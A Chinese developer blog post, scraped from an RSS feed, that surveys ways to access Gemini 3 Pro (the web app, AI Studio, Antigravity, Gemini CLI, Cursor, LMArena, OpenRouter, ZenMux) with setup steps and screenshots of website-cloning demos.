<p>目前已实现 OBS（WebRTC）推流、前端 / VLC 拉流的低延迟直播，后续计划探索 SRT 协议集成、高并发优化。<strong>万事开头难，技术沉淀在于持续踩坑与复盘</strong>~</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[体验Gemini 3 Pro的N多种方式]]></title>    <link>https://juejin.cn/post/7575106644498989090</link>    <guid>https://juejin.cn/post/7575106644498989090</guid>    <pubDate>2025-11-23T05:43:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575106644498989090" data-draft-id="7575015480198627380" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="体验Gemini 3 Pro的N多种方式"/> <meta itemprop="keywords" content="Gemini,AIGC"/> <meta itemprop="datePublished" content="2025-11-23T05:43:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="小溪彼岸"/> <meta itemprop="url" content="https://juejin.cn/user/976781670357400"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            体验Gemini 3 Pro的N多种方式
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/976781670357400/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    小溪彼岸
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T05:43:14.000Z" title="Sun Nov 23 2025 05:43:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>小伙伴们大家好，我是小溪，见字如面。这两天被Gemini 3 Pro模型的发布刷屏了，各种模型排行第一，各种炸裂了，看的眼花缭乱的，本人就不凑热闹去炸裂了（本人一直觉得能帮助自己解决问题的模型就是强的，分数就像西医制定的各种判定一个人是否正常的指标，只能作为一个参考，没有太大意义），在这里整理一下体验Gemini 3 Pro的体验方式和简单Demo看一下Gemini 3 Pro的实力，纯个人把玩仅供参考。</p>
<p>这里贴一下官方和知名模型测评平台的测评结果，在全球权威的模型评测榜单Artificial Analysis里，Gemini 3 排名第一。</p>
<p>Artificial Analysis官网地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fartificialanalysis.ai%2Fmodels%2Fgpt-5%3Fintelligence%3Dartificial-analysis-intelligence-index" target="_blank" title="https://artificialanalysis.ai/models/gpt-5?intelligence=artificial-analysis-intelligence-index" ref="nofollow noopener noreferrer">artificialanalysis.ai/models/gpt-…</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/afce0e406bd346a3849fdd07cc1bc2b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=eqIJEE1erGbV25qLaWhMYEX2E2M%3D" alt="图片" loading="lazy"/></p>
<p>Gemini 3 Pro的跑分也强的离谱，除了软件工程能力比GPT-5.1、CLaude Sonnet 4.5略低，其他能力方面基本上都是遥遥领先</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/772946b38d9645c1a9bd4e1f48ef5f81~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=WvZ3k09QeWQR%2BlBjH%2Bp4d4aALiw%3D" alt="图片" loading="lazy"/></p>
<h2 data-id="heading-1">Google Gemini</h2>
<h3 data-id="heading-2">优势</h3>
<ul>
<li>官方支持，免费使用</li>
</ul>
<h3 data-id="heading-3">限制</h3>
<ul>
<li>需要Google账号</li>
<li>需要科学上网环境</li>
</ul>
<h3 data-id="heading-4">使用</h3>
<p>官网地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgemini.google.com" target="_blank" title="https://gemini.google.com" ref="nofollow noopener noreferrer">gemini.google.com</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3826d4f73fad4268ab40b843f211206c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=qja50mBjLSVNSTMEyviwXaab80w%3D" alt="图片" loading="lazy"/></p>
<p>Gemini官网已默认使用了Gemini 3 Pro模型，直接在对话框输入提示词</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5ec3474b4449436f939902fe431595dd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=ndmetUk3ONaVmbqftcUTQHtRuQ4%3D" alt="图片" loading="lazy"/></p>
<p>任务完成后，复制代码保存到本地 index.html 文件，在浏览器中打开效果如下，就不做评价了，毕竟千人千面</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/470544273da2488c8df54f16f5ad475c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=s%2FXe2%2BFvoT7rBgw%2B5pk9pBzXHcw%3D" alt="图片" loading="lazy"/></p>
<p>截止复刻一下MiniMax的官网，MiniMax的官网还是有技术含量的，之前使用MiniMax-M2也无法复现，感兴趣的小伙伴可以看往期内容：<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzU5Njg3ODUzOA%3D%3D%26mid%3D2247493520%26idx%3D1%26sn%3Da927c6291984349476945d1437794b60%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzU5Njg3ODUzOA==&amp;mid=2247493520&amp;idx=1&amp;sn=a927c6291984349476945d1437794b60&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">追赶一趟Minimax M2限时免费末班车</a></p>
<pre><code class="hljs language-arduino" lang="arduino">https:<span class="hljs-comment">//www.minimaxi.com 复刻MiniMax官网首页</span>
</code></pre>
<p>复刻完成后，效果如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/377dc3dc546744af957dfff926004c39~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=PKefdzjVoBKCRT4Cgxz67a0BiHk%3D" alt="图片" loading="lazy"/></p>
<h2 data-id="heading-5">Google AI Studio</h2>
<h3 data-id="heading-6">优势</h3>
<ul>
<li>官方支持，免费使用</li>
</ul>
<h3 data-id="heading-7">限制</h3>
<ul>
<li>需要Google账号</li>
<li>需要科学上网环境</li>
</ul>
<h3 data-id="heading-8">使用</h3>
<p>官网地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Faistudio.google.com" target="_blank" title="https://aistudio.google.com" ref="nofollow noopener noreferrer">aistudio.google.com</a></p>
<p>在Google AI Studio首页，点击【Gemini 3 Pro Preview】即可使用Gemini 3 Pro模型</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dd9755a534f340b6ab78680a9d2d4fa0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=Lqhq50D%2Fc8P5inFZV5rzGIk9uzA%3D" alt="图片" loading="lazy"/></p>
<p>在模型列表可以看到Gemini 3 Pro的 计费方式 和 知识库截止时间</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a783e21132f7400f92f772e909052974~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=3GTWKXKMWUqjPuFh0UOBumVMnCo%3D" alt="图片" loading="lazy"/></p>
<p>使用同样的提示词，在Google AI Studio上复刻的bilibili官网首页效果如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/99a3cb4c9980461a88a226102f74e62e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=XDxev8rmjcVhON%2BSensqOvY0t%2Fc%3D" alt="图片" loading="lazy"/></p>
<p>复刻的MiniMax官网首页效果如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/513fea0e979649779a0ee4bc8f1110af~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=ieeMBzAio4prMkhYQL1LEOsfpQU%3D" alt="图片" loading="lazy"/></p>
<h2 data-id="heading-9">Google Antigravity IDE</h2>
<h3 data-id="heading-10">优势</h3>
<ul>
<li>预览阶段免费使用</li>
<li>支持 Gemini 3 Pro、Claude Sonnet 4.5</li>
</ul>
<h3 data-id="heading-11">限制</h3>
<ul>
<li>需要Google账户，对账号有一定的要求</li>
<li>需要科学上网环境</li>
<li>Gemini 3 Pro（High）每天有使用次数限制</li>
</ul>
<h3 data-id="heading-12">使用</h3>
<p>Antigravity是Google随着Gemini 3 Pro模型上线一起发布的Agent IDE，已默认支持Gemini 3 Pro模型</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e1176a01489443738bac5cd68e19d37d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=Idwt8gOnZkrQ2XOb2Q0nd3ROnaE%3D" alt="图片" loading="lazy"/></p>
<p>在Antigravity IDE上使用 Gemini 3 Pro（Low）（为什么不使用High，因为High每天有使用额度限制），Antigravity直接使用Next.js实现了，实现bilibili官网首页的复刻效果如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3f87506b6f364222b4fc9a00f9e13cca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=AhU7Mfq25svlHX9eGvhBIl7Ri98%3D" alt="图片" loading="lazy"/></p>
<p>复刻的MiniMax官网首页效果如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ccf4c55e21d04c55af7b3934c692e743~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=l031BGlS5KhMgCkeQwi1%2BBXgRvg%3D" alt="图片" loading="lazy"/></p>
<h2 data-id="heading-13">Gemini CLI</h2>
<p>对Gemini CLI感兴趣的小伙伴可以看往期内容：<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzU5Njg3ODUzOA%3D%3D%26mid%3D2247492558%26idx%3D1%26sn%3De762047c93c4361f63744ec3c70a434f%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzU5Njg3ODUzOA==&amp;mid=2247492558&amp;idx=1&amp;sn=e762047c93c4361f63744ec3c70a434f&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">Google百万Token上下文Gemini CLI，离AI自由更近一步</a></p>
<h3 data-id="heading-14">优势</h3>
<ul>
<li>Google AI Ultra、Gemini API密钥、Vertex API密钥付费用户自动开启权限</li>
</ul>
<h3 data-id="heading-15">限制</h3>
<ul>
<li>需要科学上网环境</li>
<li>免费用户需要加入候补名单</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4565396fae614b2f8aa27160badbc568~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=ThpLs1vSSCaulJv9satqqSU2HwU%3D" alt="图片" loading="lazy"/></p>
<p>官方候补地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.google.com%2Fforms%2Fd%2Fe%2F1FAIpQLScQBMmnXxIYDnZhPtTP3xr5IwHNzKW4nLomuQ1tGOO-UldMdQ%2Fviewform%3Fpli%3D1" target="_blank" title="https://docs.google.com/forms/d/e/1FAIpQLScQBMmnXxIYDnZhPtTP3xr5IwHNzKW4nLomuQ1tGOO-UldMdQ/viewform?pli=1" ref="nofollow noopener noreferrer">docs.google.com/forms/d/e/1…</a></p>
<h3 data-id="heading-16">使用</h3>
<blockquote>
<p>在Gemini CLI中使用Gemini 3 Pro需要先到设置中开启【Preview Features】</p>
</blockquote>
<p>更新到Gemini CLI最新版本，在命令行终端执行命令：</p>
<pre><code class="hljs language-ruby" lang="ruby"><span class="hljs-variable">$ </span>npm install -g <span class="hljs-variable">@google</span>/gemini-cli<span class="hljs-variable">@latest</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b389cd659bf44fd7be813dec1af9c5e1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=%2BshVfw%2Fm36hap9ZTSDsAHaIhUqQ%3D" alt="图片" loading="lazy"/></p>
<p>如果是Google账号登录的会出现如下提示，使用Gemini 3 Pro需要先加入候补名单</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/136e5eb2042a45fab1820d566d8c3533~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=ElVCsgjPr19KTwjuOFmdf8gq%2By8%3D" alt="图片" loading="lazy"/></p>
<p>这里我们使用Gemini API Key登录，在交互式命令中输入 /auth 打开登录授权页面，选择【Use Gemini API Key】</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d39776ad1b46436c875137d271bf827c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=0NNfDBWgLJV1FGwW4qGgh8oOATU%3D" alt="图片" loading="lazy"/></p>
<p>输入Gemini API Key</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ce5819e651546cbb169cc980a2af612~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=cWerSb0tvq7%2FWhLsv%2BtBVbQ99k8%3D" alt="图片" loading="lazy"/></p>
<p>登录成功后，在交互式命令中输入 /settings 打开设置，找到【Preview Features】开启</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/926a3a910503493588e2566e4d922393~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=lWZ9Yk06BITuz%2FFAXQTCesmljmM%3D" alt="图片" loading="lazy"/></p>
<p>开启成功后，重启Gemini CLI，在交互式命令中输入 /model 就可以看到 gemini-3-pro-preview 模型了，然后选择Pro模型</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3740ecd6e6d043c7ad4e4087e8faf48a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=kMHtoj5jRVssE1cxRftaajuhKmM%3D" alt="图片" loading="lazy"/></p>
<p>切换成功后，对话框右侧会显示【Pro】，然后就可以使用Gemini 3 Pro模型了</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f10e1734309f4cc3beb09f4800f4468f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=XYBc4i3udmFCuQ3aBvJ6EK6NwE8%3D" alt="图片" loading="lazy"/></p>
<p>免费用户无法使用会提示错误</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dfdcc599329b4da4a6f3c70fb51c70b1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=nTBU4Y8CAx%2BtwInrj7m%2FtSH9zE4%3D" alt="图片" loading="lazy"/></p>
<h2 data-id="heading-17">Cursor</h2>
<h3 data-id="heading-18">优势</h3>
<ul>
<li>可以使用Cursor特性功能</li>
</ul>
<h3 data-id="heading-19">限制</h3>
<ul>
<li>
<p>需要订阅Cursor</p>
</li>
<li>
<p>需要配置科学上网环境</p>
</li>
</ul>
<h3 data-id="heading-20">使用</h3>
<p>Cursor中已经支持了Gemin 3 Pro模型，开通Cursor订阅的小伙伴选择模型后可以直接使用，本人Cursor会员到期了这里就不做演示了。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/278b20dd6935466ba3f9bf783b0a50cf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=Kb81Re%2FszKKzSZMVeOvtC2dAWDQ%3D" alt="图片" loading="lazy"/></p>
<h2 data-id="heading-21">LMArena</h2>
<p>LMArena 由加州大学伯克利分校的研究人员创建，是一个开放平台，每个人都可以轻松访问、探索世界领先的人工智能模型并与之交互。通过并排比较它们并投票以获得更好的回应，社区有助于塑造公共排行榜，使人工智能进步更加透明，并立足于现实世界的使用。</p>
<p>官网地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Flmarena.ai%2F" target="_blank" title="https://lmarena.ai/" ref="nofollow noopener noreferrer">lmarena.ai/</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/721ba27542fe48458ed0d0f2f2d8c2b1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=RurNDD6JWQzF1dvwRpueCTDQolE%3D" alt="图片" loading="lazy"/></p>
<h3 data-id="heading-22">优势</h3>
<ul>
<li>免费使用，提供模型对比</li>
<li>提供所有主流模型</li>
</ul>
<h3 data-id="heading-23">限制</h3>
<ul>
<li>需要科学上网环境</li>
</ul>
<h3 data-id="heading-24">使用</h3>
<p>在LMArena首页选择【gemini-3-pro】模型</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9e22f1ab995746268f4c93658058ff9c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=tor%2BIm8TmyzxcepPR%2F%2FBT%2FFR5Sg%3D" alt="图片" loading="lazy"/></p>
<p>输入同样的提示词，在LMArena上复刻的bilibili官网首页效果如下（感觉这个是目前复刻效果最好的一次，难道官方降智了？🤣）</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bbf7541758f7480182558141161b573c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=K96PKRu0FCA3A7eBdASQyMqDrVI%3D" alt="图片" loading="lazy"/></p>
<p>复刻的MiniMax官网首页效果如下（MiniMax官网含金量还在上升😂）</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f1743377cd904229b1c3165ae6d22c68~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=0p1xoz2nfoigomtHNXOXVO87mBc%3D" alt="图片" loading="lazy"/></p>
<h2 data-id="heading-25">OpenRouter</h2>
<p>官网地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fopenrouter.ai" target="_blank" title="https://openrouter.ai" ref="nofollow noopener noreferrer">openrouter.ai</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/81825fc04e9b4a218f3ff38680fddccf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=nrlSeKWDmbOMxzjLiehcp%2BIDJOk%3D" alt="图片" loading="lazy"/></p>
<h3 data-id="heading-26">优势</h3>
<ul>
<li>国内可用</li>
<li>提供所有主流模型</li>
</ul>
<h3 data-id="heading-27">限制</h3>
<ul>
<li>Gemini 3 Pro需要付费使用</li>
</ul>
<h3 data-id="heading-28">使用</h3>
<p>在模型对话页面选择【Gemini 3 Pro Preview】模型</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a9d92aa6e2654b84b59628198ce25dbf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=bmb%2BqabhFojVHES54IVUqFp9jJA%3D" alt="图片" loading="lazy"/></p>
<p>本人OpenRouter欠费了，这里就不做demo了</p>
<h2 data-id="heading-29">ZenMux</h2>
<p>ZenMux是一个类似OpenRouter的模型聚合平台</p>
<p>官网地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fzenmux.ai" target="_blank" title="https://zenmux.ai" ref="nofollow noopener noreferrer">zenmux.ai</a></p>
